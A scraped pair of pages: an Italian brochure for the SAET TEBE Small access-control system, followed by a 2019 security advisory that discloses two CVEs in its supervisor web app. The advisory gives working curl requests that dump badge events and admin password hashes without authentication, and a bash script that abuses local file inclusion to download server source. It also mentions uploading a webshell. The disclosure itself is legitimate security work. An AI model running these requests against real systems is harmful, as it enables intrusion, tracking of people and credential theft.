=== Content from www.saet.org_878261cf_20250120_232057.html ===
TEBE
CRESCE
E SI FA
PICCOLA

La famiglia Tebe diventa più grande
con Tebe Small, la più piccola della
linea Saet per il controllo accessi.

SAET Impianti Speciali 10077 San Maurizio C.se (TO) - Italy - Via Leinì; 1/b
Tel 0119275296 r.a. - Fax 0119278846 - commerciale@saet.org

www.saet.org  |  www.grupposaet.com

IL CON-
TROLLO
ACCESSI
DIVENTA
ACCES-
SIBILE.

NASCE TEBE SMALL

Tebe Small è l’ultimo nato nella

famiglia di prodotti Tebe per il

controllo accessi.

Una soluzione funzionale, semplice

e accessibile. Un prodotto che nasce

dall’esperienza decennale di Tebe,

adattata ai piccoli impianti e a tutte le

realtà che desiderano un

sistema di controllo accessi verticale,

senza esigenze d’integrazione e

programmabilità.

NASCE
TEBE
SMALL

Facile installazione, configurazione e

start-up agevoli, gestione attraverso

web e mobile con interfaccia intuitiva:

con queste caratteristiche Tebe

Small offre una soluzione innovativa

e funzionale, nata da oltre 10 anni di

esperienza tecnologica della

famiglia di prodotti TEBE.

03

ADATTARSI AL
CAMBIAMENTO.

04

   Non è la specie più forte o la
più intelligente a sopravvivere
ma quella che si adatta meglio
al cambiamento.

Charles Darwin.

Sapersi modificare, adattare, riplasmare.

Sapersi muovere dal piccolo al grande,

dal semplice al complesso.

Saper cambiare mantenendo le

proprie caratteristiche.

Questo rende la linea di prodotti Saet

TEBE unica e flessibile, pronta ad

adattarsi a tutte le esigenze possibili.

05

TEBE Small, è la nuova soluzione di

Saet, ideale per soddisfare tutte le

esigenze standard di controllo degli

accessi. Tebe Small rende accessibile

la qualità tecnologica del controllo

accessi Saet ad un pubblico ampio,

interessato ad un sistema di controllo

verticale, semplice e funzionale,

nell’installazione e nella gestione.

TEBE, la soluzione tradizionale

per le esigenze più complesse. Un

prodotto per il controllo accessi

che vanta oltre dieci anni di

esperienza. Programmabilità ed

integrazione con l’antintrusione

e il controllo tecnologico fanno di

TEBE un prodotto che garantisce un

elevato grado di customizzazione e

performance assolute.

LA FAMIGLIA TEBE

LE
DUE
ANIME
DI
TEBE.

http://image.shutterstock.com/display_pic_with_logo/850657/404617165/stock-photo-speed-light-background-404617165.jpg

INSTALLAZIONE E GESTIONE

SAET HI Cloud

TCP/IP

TCP/IP

RS485
Antintrusione /
Controllo tecnologico

RS485
Controllo Accessi

Terminale TEBE Small
1

Terminale TEBE Small
2

SUPERVISOR

CONTROLLO
TECNOLOGICO

CENTRALE
TEBE

07

RS485

INTERFACCIA WEB

Terminale TEBE Small
...

Terminale TEBE Small
64

TEBE SMALL

ANTINTRUSIONE

RILEVAZIONE
FUMI

Modulo varco
1

Modulo varco
64

TEBE

08

ARCHITETTURE
DI PRODOTTO.

SUPERVISOR

INNOVATIVA GESTIONE
TRAMITE WEB SERVER.

INSTALLAZIONE E GESTIONE

SAET HI CLOUD

PIATTAFORMA DI
SUPERVISIONE INTEGRATA.

09

Tebe Small ha due possibili soluzioni

software di gestione: tramite web server

per applicazioni verticali di controllo

accessi oppure tramite sistema di

supervisione SAET HI_CLOUD per

soluzioni integrate.

TEBE SMALL,
DUE SOLUZIONI
DI GESTIONE.

Anti
intrusione

Accessi
e varchi

Anti
incendio

Controllo
tecnologico

TV CC

TEBE SMALL PUÒ SUPPORTARE

DIVERSE TECNOLOGIE DI

AUTENTICAZIONE, DALLE PIÙ

CLASSICHE E CANONICHE A

QUELLE PIÙ INNOVATIVE E

TECNOLOGICAMENTE AVANZATE.

11

TECNOLOGIE DI AUTENTICAZIONE

TEBE SMALL:
LE TECNOLOGIE
DI AUTENTICA-
ZIONE.

12

RFID (RADIO-FREQUENCY IDENTIFICATION)

È una tecnologia per l'identificazione e/o

memorizzazione di informazioni basata sulla capacità

di memorizzare dati da parte di etichette elettroniche,

chiamate bagde, tag o transponder. Questa

identificazione avviene mediante radiofrequenza.

NFC (NEAR FIELD COMMUNICATION)

La nuova frontiera della tecnologia RFID. Un sistema

che permette lo scambio bidirezionale d’informazioni

fra un apparato mobile, tipicamente uno smartphone,

ed una lettore in radiofrequenza a 13,56 Mhz. È una

soluzione adottata dai maggiori produttori di telefonia.

UHF LONG RANGE

Si tratta di una tecnologia che, pur

utilizzando badge passivi (privi quindi di

batteria), è in grado di riconoscere un

soggetto (persona o veicolo) in movimento

anche a distanze significative (fino a 10

metri). Le applicazioni più comuni sono il

controllo dei varchi carrai o le funzioni di

people counting durante fiere ed eventi.

SERRATURE MECCATRONICHE WIRELESS

RADIOCOMANDI

TECNOLOGIE DI AUTENTICAZIONE

13

Il Sistema TEBE integra le serrature meccatroniche

wireless trasformando una semplice porta in un sistema

di controllo accessi, grazie alla tecnologia RFID.

Una soluzione pratica e flessibile, con un’ampia gamma

di alto design per un’integrazione completa, funzionale

ed estetica, con ogni tipologia di porta. La serratura

meccatronica wireless si monta su qualunque porta ed

integra il lettore, la maniglia e il lettore di badge RFID.

BIOMETRICO

Relativamente alla soluzione biometrica, di recente

introdotta su molti smartphone, SAET propone il perfetto

mix di sicurezza e scalabilità grazie ad un apparecchio

che integra la lettura RFID ed il modulo biometrico di

lettura dell’impronta digitale.

Il sistema conserva il template biometrico sul badge

di proprietà del dipendente garantendo il rispetto della

normativa vigente in materiale di privacy.

Risponde all’esigenza di aprire un varco carraio

(sbarra / portone / basculante) da una vettura tramite

un radiocomando. Questa soluzione consente di

gestire un varco carraio con un costo più basso

di un lettore Long Range evitando comunque che

l’occupante il veicolo debba tirare fuori il braccio per

leggere il badge RFID.

Il Sistema TEBE è in grado di riconoscere

singolarmente i telecomandi distribuiti e di gestirli

come se fossero dei badge applicando tutte le logiche

di filtro di un sistema di controllo accessi completo.

14

ESEMPI APPLICATIVI

CONTROLLO DI 2 PORTE PEDONALI

TEBE controlla il flusso delle persone da

2 porte (tipicamente limitrofe) nella sola

direzione di entrata. L’uscita è libera e non

richiede la lettura di un titolo valido ma

prevede un pulsante o un maniglione.

Termianle
TEBE Small

16

CONTROLLO DI UNA PORTA

PEDONALE MONODIREZIONALE

TEBE controlla il flusso delle persone

attraverso 1 porta nella sola direzione di

entrata. L’uscita è libera e non richiede la

lettura di un titolo valido ma, tipicamente,

richiede un pulsante o un maniglione.

15

CONTROLLO DI UNA PORTA

PEDONALE BIDIREZIONALE

TEBE controlla il flusso delle persone

attraverso 1 porta in entrambe le direzioni

(entrata ed uscita) tramite 2 lettori.

Termianle
TEBE Small

Termianle
TEBE Small

ESEMPI
APPLICATIVI

Termianle
TEBE Small

Termianle
TEBE Small

Termianle
TEBE Small

CONTROLLO DI 1 TORNELLO

TRIPODE / TUNNEL

TEBE controlla il flusso delle persone

attraverso un tornello tripode in

entrambe le direzioni (entrata ed

uscita). Il terminale è in grado di gestire

due comandi indipendenti per lo sblocco

in entrambe le direzioni.

17

GESTIONE CAMERA D’ALBERGO

TEBE gestisce il riconoscimento

dell’ospite dotato di titolo valido e

comanda l’apertura della porta. La

presenza del badge nella tasca porta-

badge abilita le utenze (luce e clima)

della camera.

CONTROLLO PROCESSO SU

MACCHINE UTENSILI

TEBE identifica l’operatore ed abilita

l’operatività di una macchina utensile o

di un’intera isola di lavoro in funzione

delle permission e degli orari. Registra

il tempio di impiego, le ore lavorate e gli

operatori che hanno operato.

ESEMPI APPLICATIVI

Termianle
TEBE Small

Termianle
TEBE Small

Termianle
TEBE Small

18

CONTROLLO DI VARCO VEICOLARE

LONG RANGE

TEBE riconosce la vettura e il suo

conducente anche in condizione

di flusso intenso di mezzi senza

richiederne l’arresto. Riconosce un

veicolo in movimento ad una velocità

massima di 30 Km/h.

CONTROLLO DI VARCO VEICOLARE

CON RADIOCOMANDO

TEBE riconosce singolarmente i

radiocomandi codificati. Senza uscire

dalla vettura ogni utente si autentica

premendo un tasto del proprio

radiocomando. Il sistema filtra l’accesso

in funzione delle permissione degli orari.

TIMBRATURE E CONTROLLO

DELLE PRESENZE

TEBE acquisisce le timbrature

finalizzate al calcolo monte ore e

alle paghe. Il display touch screen

consente all’utente un’interazione

semplice e veloce.

LUCCHETTI WIRELESS

TEBE gestisce lucchetti wireless con lettore Mifare integrato. Velocità

e flessibilità d’uso unita alla possibilità di variare la destinazione d’uso

degli spazi al variare delle esigenze. Questa applicazione richiede la

Centrale TEBE.

19

SERRATURE WIRELESS

La Centrale TEBE gestisce fino a 63 serrature wireless con lettore

Mifare integrato. L’assenza di cablaggi e di predisposizioni sulla porta

consentono di modificare il layout degli spazi e la loro destinazione in

modo semplice e veloce. Questa applicazione richiede la Centrale TEBE.

Controllo Accessi

TEBE SMALL

Si

TEBE

Si

Standard Lettori compatibili

Magtrack (in caso di lettore tessera magnetica Standard Traccia 2)

Tecnologie di Autenticazione e
Riconoscimento

Antintrusione e Controllo
Tecnologico

Numero massimo di ingressi
(Antintrusione e Controllo
Tecnologico)

Zone Semplici

Zone Insieme

Architettura di connessione dei
Terminali di Controllo Accessi

Protocollo SAETCom

Protocollo CEI-ABI

Protocollo Modbus

Modulo GPRS

N° di identificativi

Gestione PIN personale

Profili

Fasce Orarie

Festività fisse

Causali di Transito

Aree

Antipass back

Antipass back a tempo

Coercizione

Buffer eventi

Wiegand (26, 35, 37, 40, 58 bit)

RFID - MIFARE (Classic, Ultralight, Plus, DESFire) / 125 KHx (HID,
Sokymat)
NFC
Long Range
Biometrico dell'impronta digitale
Serrature meccatroniche wireless
Radiocomandi codificati

No

N.A.

N.A.

N.A.

Si

256

215

36

TCP/IP / Echelon RS485

Echelon RS485

No

No

No

No

65.000

No

10

No

Si

Si

Si

Si (opzionale)

4.000 / 65.000

Si

128

Si

si - 5 cifre

250

64

256

Si

Si

200.000

20.000

Cifratura della comunicazione

Si (chiave a 32 bit)

Si (chiave a 256 bit)

Funzionamento in "Modalità
Degradata" (Terminale fuori Linea)

Aggiornamento firmware dei
Terminali

Aggiornamento firmware dei
Terminale TOUCH

Interfaccia WEB di gestione
(Supervisor)

Compatibilità con Sistema di
Supervisione GEMSS

Compatibilità con Sistema di
Supervisione HI_Cloud

Tensione di alimentazione

Alimentatore

Vano accumulatore

Si

Si

Si

Si

No

Si

230Vac - 15% + 10% 50/60 Hz

1,7 A / 2,8 A

7 Ah / 18 Ah

No

No

No

No

Si

Si

2,8 A

18 Ah

IL GRUPPO SAET

Una realtà italiana d’eccellenza

nelle tecnologie per la sicurezza e

l’automazione, leader italiano nei sistemi

integrati per la sicurezza.

Un Gruppo che fa della sinergia tra lo

Stabilimento di Torino, le Sedi di Milano

e Roma e la rete dei Concessionari il

proprio punto di forza.

www.grupposaet.com

TEBE CRESCE
E SI FA PICCOLA.



=== Content from members.backbox.org_bdd7a2f2_20250120_232053.html ===

[![BackBox.org Membership](data:image/svg+xml...)](https://members.backbox.org/)

* [BackBox.org](https://www.backbox.org)
* [Home](https://members.backbox.org/)
* [Jobs](https://members.backbox.org/jobs/)
* [Partnership](https://members.backbox.org/category/partnership/)
* [Sharing Board](https://members.backbox.org/sharing-board/)
* [Sitemap](https://www.backbox.org/sitemap/)
* [Contact](https://www.backbox.org/contact)
* [Search](?s=)
* **Menu**

  Menu

# SAET TEBE Small Supervisor, Multiple Vulnerabilities

March 25, 2019/in [Sharing Board](https://members.backbox.org/category/sharing-board/)

# Product version: v05.01 build 1137
# Webapp version: v04.68
# Vendor homepage: https://www.saet.org/

**I. INTRODUCTION**

TEBE Small is a physical access control system manufactured by SAET Impianti Speciali.
It consists in a modular network of *“terminals”* which are deployed in a building and read badges or other authentication mechanisms, and a *“supervisor”*, which is typically installed on a Raspberry Pi, who manages and orchestrates the terminals.
On the supervisor is installed a Web Application that provides a dashboard used by the administrator to control the behavior of the terminals and to manage the user permissions and authorization.

**II. DESCRIPTION**

The Web Application is affected by some vulnerabilities that allow an attacker to overtake the system by gaining the admin password.

The vulnerabilities found are listed below:

* Local File Inclusion (CVE-2019-9106)
* Unauthenticated API calls (CVE-2019-9105)

**III.  PROOF OF CONCEPT**

We assume that the supervisor is installed at *“https://my-supervisor.tld”*.

We start by looking at the file *“https://my-supervisor.tld/inc/js/saet.js”*, which is included in the index page.

This file is filled with JavaScript functions that call a REST API proxy served at *“https://my-supervisor.tld/inc/utils/REST\_API.php”*.

```
function startRealTime() {
    "use strict";

    $('.eventstable tbody').empty();
    $('#start-real-time').hide();
    $('#last-events').hide();
    $('#fromdate, #todate').hide();
    $('#stop-real-time').show();

    sendRtc();

    $.get('inc/utils/REST_API.php', {
        command: 'CallAPI',
        customurl: 'history/maxlastupdate',
        method: 'GET'
    }, function(data) {
        lastupdate = data.lastupdate;
        startedRealTime = 1;
      	    timeout = setTimeout( getLastEvents, realTimeInterval);
    }, "json");
}
```

If we try to construct the API call, we come to this:

```
$ curl "https://my-supervisor.tld/inc/utils/REST_API.php?command=CallAPI&customurl=history%2Fmaxlastupdate&method=GET&svm_id="
{"lastupdate": 1550490686073, "causal_code": 0, "area": 1, "timestamp": 1550490685, "user_second_name": "Doe", "user_first_name": "John", "badge_id": 1234, "terminal_id": 6, "synchronised": false, "event": 7, "svm_id": 0}
```

So we can monitor in real time people coming in and out, without any authentication.

By further investigating the *“saet.js”* file we can detect some other interesting API calls. We can, for example, dump the whole database of events with a single command, so no polling needed:

```
$ curl "https://my-supervisor.tld/inc/utils/REST_API.php?command=CallAPI&customurl=history%2Ffilter%2F%3Fstartdate%3D0%26enddate%3D1532683263728%26badges%3D*%26titolari%3D*%26event_type%3D*%26terminals%3D*%26causals%3D*%26areas%3D*%26logic%3Dand_%26limit%3D1000%26offset%3D0%26lastupdate%3D0&startdate=&enddate=&logic=1&method=GET&svm_id="
```

We now need to log in to further proceed with our analysis: luckily the sysadmin has left a weak password on the dashboard, so we can easily break in and star inspecting new pages.

The first thing to pay attention at is the way the various views are displayed: *“https://my-supervisor.tld/index.php?menu=VIEW\_NAME”*

If we try to fuzz this *“menu”* field with some random string (*“aaa”*), we end up to something interesting:

```
Warning: require(aaa.php): failed to open stream: No such file or directory in /data/webapp/index.php on line 141
Fatal error: require(): Failed opening required 'aaa.php' (include_path='.:/usr/share/php:/usr/share/pear') in /data/webapp/index.php on line 141
```

So it seems the page is appending a *“.php”* extension to the *“menu”* field and trying to include it.

Moreover, the php filter *“convert.base64-encode”* is enabled, so we are able not only to include arbitrary php files, but also to encode them and download the source code.

To automate the process of downloading *“.php”* files from the server, we can write a simple bash script:

```
#!/bin/bash

USER="admin"
PASSWORD="password"
URL="https://my-supervisor.tld"

curl -c cookies.txt -b cookies.txt -s -i -k -X 'POST' --data "username=$USER&password=$PASSWORD&login=" "$URL" > /dev/null
curl -c cookies.txt -b cookies.txt "$URL/?menu=php://filter/convert.base64-encode/resource=$1" | grep '<div class="container alert alert-danger error_log">' | sed -r 's/<div class="container alert alert-danger error_log"><\/div>(.*)<\/div> <!-- mainwrapper -->/\1/g' | base64 -d
```

We can use this script to download, for example, the *“index.php”*:

```
$ ./exfiltrator.sh index > index.php
```

Now that we are able to download files, we need something useful to actually download.
We could now run a crawler or an URL fuzzer in order to detect relevant files.

From the results, it turns out that directory indexing is enabled on *“/admin/”* and *“/inc/”*, so that we don’t need to go through the code to find out interesting files to download, but what is most relevant now is a *“login.php”* file in the root directory.

Let’s download it with our previous exfiltrator script and investigate:

```
<?php
    $svType = CallAPI( "GET", "whoami" );

    $foundAdmin = 0;
    if($svType == 'svm') {
        $userquery = json_decode(CallAPI( "GET", "alladminusers", 0 ) );
        if(sizeof($userquery) > 0) {
    	    foreach($userquery as $userObj) {
                $adminuser = (array)$userObj;
    	        if($adminuser['role'] == ADMIN) {
    	            $foundAdmin = 1;
                    break;
    		}
            }
        }
    } else {
        $foundAdmin = 1;
    }
    if($foundAdmin):
?>
```

The API call *“alladminusers”* appears to return a lot of useful stuff: it is worth a try…

```
$ curl "https://my-supervisor.tld/inc/utils/REST_API.php?command=CallAPI&customurl=alladminusers&method=GET&svm_id="
[{"username": "admin", "first_name": "admin", "role": 5, "plant_name": null, "password": "5f4dcc3b5aa765d61d8327deb882cf99", "second_name": "admin", "svm_id": 0}]
```

So now we can retrieve MD5 hashes of every admin account on the machine, all without authentication.

Once you log in the dashboard you can obviously do anything an admin can do, including enabling and disabling terminals, badges, downloading the access database, tamper with it and upload it again.

There’s even an upload form, where you are allowed to upload a *“New Firmware”*. There is no check in place to control the type of the file uploaded, so it is possible to upload a PHP webshell.

It gets uploaded to (extract from *“/inc/global.php”*):

```
define('NEW_FIRMWARE_FOLDER', '/data/firmware_new/');
```

But unluckily there’s a check in place in the `index.php` file which replaces all “\_” with “/”, so we are unable to include that with the previous technique:

```
if($menu == '')
    require($defaultUrl);
else {
    $menuitem = str_replace('_', '/', $menu);
    require($menuitem.'.php');
}
```

***Recap***

You can easily gain admin access to the dashboard and fully overtake the system.
Not only this: you can also both download and execute any file which ends with *“.php”*, except those containing an underscore in their path, and you can upload files too: the dashboard allows you to upload any kind of file in the “firmware update” tab. We are still unable to get a shell because of the underscore in the firmware upload path, but this deserves further investigations.

**IV. BUSINESS IMPACT**
These flaws may compromise the integrity of the system and/or expose sensitive information.

**VI. VULNERABILITY HISTORY**
February 6th, 2019: Vendor notification

**VII. LEGAL NOTICES**
The information contained within this advisory is supplied “as-is” with no warranties or guarantees of fitness of use or otherwise. We accept no responsibility for any damage caused by the use or misuse of this information.

##### Share this entry

* [Share on Facebook](https://www.facebook.com/sharer.php?u=https://members.backbox.org/saet-tebe-small-supervisor-multiple-vulnerabilities/&t=SAET%20TEBE%20Small%20Supervisor%2C%20Multiple%20Vulnerabilities)
* [Share on X](https://twitter.com/share?text=SAET%20TEBE%20Small%20Supervisor%2C%20Multiple%20Vulnerabilities&url=https://members.backbox.org/?p=1203)
* [Share on Pinterest](https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fmembers.backbox.org%2Fsaet-tebe-small-supervisor-multiple-vulnerabilities%2F&description=SAET%20TEBE%20Small%20Supervisor%2C%20Multiple%20Vulnerabilities&media=)
* [Share on LinkedIn](https://linkedin.com/shareArticle?mini=true&title=SAET%20TEBE%20Small%20Supervisor%2C%20Multiple%20Vulnerabilities&url=https://members.backbox.org/saet-tebe-small-supervisor-multiple-vulnerabilities/)
* [Share on Tumblr](https://www.tumblr.com/share/link?url=https%3A%2F%2Fmembers.backbox.org%2Fsaet-tebe-small-supervisor-multiple-vulnerabilities%2F&name=SAET%20TEBE%20Small%20Supervisor%2C%20Multiple%20Vulnerabilities&description=%23%20Product%20version%3A%20v05.01%20build%201137%23%20Webapp%20version%3A%20v04.68%23%20Vendor%20homepage%3A%20https%3A%2F%2Fwww.saet.org%2F%20I.%20INTRODUCTION%20TEBE%20Small%20is%20a%20physical%20access%20control%20system%20manufactured%20by%20SAET%20Impianti%20Speciali.It%20consists%20in%20a%20modular%20network%20of%20%E2%80%9Cterminals%E2%80%9D%20which%20are%20deployed%20in%20a%20building%20and%20read%20badges%20or%20other%20authentication%20mechanisms%2C%20and%20a%20%E2%80%9Csupervisor%E2%80%9D%2C%20which%20is%20typically%20installed%20on%20%5B%E2%80%A6%5D)
* [Share on Vk](https://vk.com/share.php?url=https://members.backbox.org/saet-tebe-small-supervisor-multiple-vulnerabilities/)
* [Share on Reddit](https://reddit.com/submit?url=https://members.backbox.org/saet-tebe-small-supervisor-multiple-vulnerabilities/&title=SAET%20TEBE%20Small%20Supervisor%2C%20Multiple%20Vulnerabilities)
* Share by Mail
https://www.backbox.org/wp-content/uploads/2018/09/website\_backbox\_text\_black.png
0
0

admin
https://www.backbox.org/wp-content/uploads/2018/09/website\_backbox\_text\_black.png

admin2019-03-25 19:39:322019-04-11 13:28:09SAET TEBE Small Supervisor, Multiple Vulnerabilities

Copyright © BackBox.org

* [X](https://twitter.com/backbox_org "X")
* [Facebook](https://www.facebook.com/backbox.org/ "Facebook")
* [LinkedIn](https://www.linkedin.com/company/backbox-org/ "LinkedIn")
* [Youtube](https://www.youtube.com/%40backboxlinux-yt "Youtube")
* [Telegram](http://t.me/backbox_org "Telegram")

[Huawei HG532, Command Injection](https://members.backbox.org/huawei-hg532-command-injection/)[![](data:image/svg+xml...)ADEngine, Dark Web Monitoring and Data Leak Detection](https://members.backbox.org/adengine-dark-web-monitoring-and-data-leak-detection/)
[Scroll to top](#top "Scroll to top")


